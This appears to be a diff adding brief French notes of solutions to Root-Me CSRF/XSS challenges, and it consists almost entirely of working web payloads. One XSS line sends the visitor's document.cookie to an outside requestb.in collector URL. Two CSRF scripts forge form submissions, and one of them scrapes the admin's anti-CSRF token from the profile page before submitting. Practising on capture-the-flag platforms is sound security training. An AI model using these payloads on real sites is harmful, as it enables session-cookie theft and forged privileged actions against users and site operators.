@@ -1,0 +1,31 @@
+Faille CSRF / XSS
+  <script>document.write('<img src=\'https://requestb.in/xxxxx?cookie='+document.cookie+'\>admin</img>');</script>
+  https://requestb.in/
+
+  <script>
+var formData = new FormData();
+
+formData.append("username", "test");
+formData.append("status", "on");
+var request = new XMLHttpRequest();
+request.open("POST", "http://challenge01.root-me.org/web-client/ch22/index.php?action=profile");
+request.send(formData);
+</script>
+
+Avce un syteme de token
+<script>
+
+                // récupération de la page par l'admin
+                xhttp = new XMLHttpRequest();
+                xhttp.open("GET", "http://challenge01.root-me.org/web-client/ch23/?action=profile", false);
+                xhttp.send();
+
+                // extraction du token
+                token_admin = (xhttp.responseText.match(/[abcdef0123456789]{32}/));
+
+                // insertion du token dans notre formulaire
+                 document.getElementById('token').setAttribute('value', token_admin)
+
+                // envoi du formulaire
+                document.csrf_form.submit();
+</script>
